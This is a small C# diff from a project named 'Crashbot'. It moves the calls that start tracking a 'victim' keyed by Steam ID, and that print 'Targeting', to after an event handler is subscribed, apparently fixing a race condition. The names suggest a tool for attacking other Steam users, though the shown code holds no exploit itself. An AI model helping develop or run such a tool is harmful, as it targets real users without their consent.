@@ -80,10 +80,6 @@ namespace Crashbot
         {
             if (this.victims.TryGetValue(v.SteamId, out var victim))
             {
-                victim.StartTracking();
-                string name = this.LoadVictimName(victim);
-                Console.WriteLine($"Targeting '{name}'");
-
                 AutoResetEvent Step = new(false);
 
                 void onSettingsLoaded(PrivacyState _) 
@@ -92,6 +88,10 @@ namespace Crashbot
                     victim.PrivacySettingsChanged -= onSettingsLoaded;
                 };
                 victim.PrivacySettingsChanged += onSettingsLoaded;
+
+                victim.StartTracking();
+                string name = this.LoadVictimName(victim);
+                Console.WriteLine($"Targeting '{name}'");
 
                 Step.WaitOne();
 
